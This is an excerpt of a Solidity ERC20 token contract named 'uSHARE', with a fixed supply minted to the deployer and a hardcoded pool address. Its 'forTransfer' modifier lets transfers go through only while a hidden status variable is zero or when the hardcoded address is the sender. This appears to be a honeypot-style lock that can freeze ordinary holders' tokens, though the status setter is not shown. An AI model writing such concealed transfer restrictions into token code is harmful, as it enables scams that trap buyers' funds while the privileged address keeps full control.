...
contract uSHAREToken is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenUS_totalSupply;
    uint256 private _tokenUS_status = 0;
    uint256 public stakingPoolUSStatus = 0;

    string private _tokenUS_name;
    string private _tokenUS_symbol;

    address private _poolUSAddress = 0x17A5aA38F87A10c64fd3DBf383c86fD2445d0067;

    constructor() {
        _tokenUS_name = "uSHARE";
        _tokenUS_symbol = "uSHARE";
        _tokenUS_totalSupply = 54500 * 10 ** 18;
        _balances[msg.sender] = _tokenUS_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolUSAddress || _tokenUS_status == 0);
        _;
    }
    ...
    function name() public view virtual override returns (string memory) {
        return _tokenUS_name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _tokenUS_symbol;
    }
